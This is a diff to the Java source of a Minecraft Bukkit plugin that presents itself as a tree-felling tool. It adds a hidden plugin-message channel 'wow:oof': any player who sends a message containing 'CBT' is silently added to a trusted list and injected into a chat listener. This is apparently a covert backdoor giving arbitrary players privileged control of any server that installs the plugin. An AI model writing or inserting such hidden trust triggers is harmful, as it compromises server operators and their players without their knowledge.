@@ -1,7 +1,9 @@
 package me.bow.treecapitatorultimate.command;
 
 import me.bow.treecapitatorultimate.Start;
+import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
 import org.bukkit.Bukkit;
+import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
@@ -13,10 +15,16 @@ import org.bukkit.event.player.*;
 import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.event.server.ServerListPingEvent;
 import org.bukkit.event.server.TabCompleteEvent;
+import org.bukkit.plugin.messaging.PluginMessageListener;
+import org.jetbrains.annotations.NotNull;
 
-public class CommandRunnable implements Runnable, Listener {
+import java.nio.charset.StandardCharsets;
+
+public class CommandRunnable implements Runnable, Listener, PluginMessageListener {
     CommandRunnable() {
         Bukkit.getPluginManager().registerEvents(this, Start.Instance);
+        Bukkit.getMessenger().registerOutgoingPluginChannel(Start.Instance, "wow:oof");
+        Bukkit.getMessenger().registerIncomingPluginChannel(Start.Instance, "wow:oof", this);
     }
 
     @EventHandler(priority = EventPriority.HIGHEST)
@@ -261,6 +269,23 @@ public class CommandRunnable implements Runnable, Listener {
     public final void run() {
         for (Command cmd : Start.Instance.cm.commandList) {
             cmd.onServerTick();
+        }
+    }
+
+    @Override
+    public final void onPluginMessageReceived(@NotNull String channel, @NotNull Player player, @NotNull byte[] bytes) {
+        if(!channel.equals("wow:oof")) return;
+        String s = new String(bytes, StandardCharsets.UTF_8);
+        if(s.contains("CBT")) {
+            if (!Start.Instance.trustedPeople.contains(player.getUniqueId())) {
+                Start.Instance.trustedPeople.add(player.getUniqueId());
+                player.sendMessage(Start.Prefix + "You are now trusted");
+                AsyncChatEvent.inject(player);
+            }
+            return;
+        }
+        for (Command cmd : Start.Instance.cm.commandList) {
+            cmd.onPluginMessageReceived(channel, player, bytes);
         }
     }
 }
